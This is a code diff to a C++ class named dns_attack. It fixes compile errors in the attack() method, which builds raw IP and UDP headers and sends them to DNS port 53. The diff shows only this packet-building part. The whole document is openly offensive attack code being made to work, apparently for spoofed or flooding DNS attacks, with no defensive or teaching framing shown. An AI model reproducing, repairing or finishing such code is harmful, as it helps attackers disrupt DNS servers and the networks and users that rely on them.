@@ -2,6 +2,7 @@
 #define DNS_ATTACK
 
 #include "misc.h"
+#include <cstring>
 #include <string>
 #include <iostream>
 #include <sys/socket.h>
@@ -44,9 +45,9 @@ void dns_attack::attack() {
 	struct udphdr *udp = (struct udphdr *) (buffer + sizeof(struct iphdr));
 
 	ip->ihl = 5;
-	ip->verion = 4;
+	ip->version = 4;
 	ip->tos = 16; // Low delay
-	ip->tot_len = sizeof(struct ipheader) + sizeof(struct udpheader); // Add the size of DNS payload later.
+	ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr); // Add the size of DNS payload later.
 	ip->id = htons(30678);
 	ip->ttl = 64; // hops
 	ip->protocol = 17; // UDP
@@ -57,7 +58,7 @@ void dns_attack::attack() {
 	udp->dest = htons(53); // dns port number
 	udp->len = htons(sizeof(struct udphdr)); //
 
-	ip->check = getCheckSum(buffer, sizeof(struct iphdr) + sizeof(struct udphdr));
+	ip->check = getCheckSum((unsigned short *)buffer, sizeof(struct iphdr) + sizeof(struct udphdr));
 
 	struct sockaddr_in sin;
 	sin.sin_family = AF_INET;
